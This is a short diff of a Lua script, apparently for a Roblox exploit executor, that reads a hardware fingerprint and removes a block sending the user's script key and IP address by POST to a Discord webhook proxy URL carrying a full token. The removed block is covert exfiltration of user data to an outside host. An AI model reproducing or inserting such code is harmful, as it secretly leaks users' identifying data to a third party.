@@ -6,16 +6,7 @@ local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Bod
 local decoded = game:GetService('HttpService'):JSONDecode(body)
 local hwid = decoded.headers["Syn-Fingerprint"]
 
-local response = syn.request(
-    {
-        Url = 'https://webhook.lewisakura.moe/api/webhooks/1085595166628388884/gTubeBJ2uH9-LhwrVqma4t-B-xNkjVYevMA-2YqUuRjtJKn55-Bm7KR2EpKtoNeiyjjn',
-        Method = 'POST',
-        Headers = {
-            ['Content-Type'] = 'application/json'
-        },
-        Body = game:GetService('HttpService'):JSONEncode({content = "```Script Key: ```" ..script_key.."    ".."```IP: ```"..ip.."*"})
-    }
-);
+
 
 
 local webhookcheck =
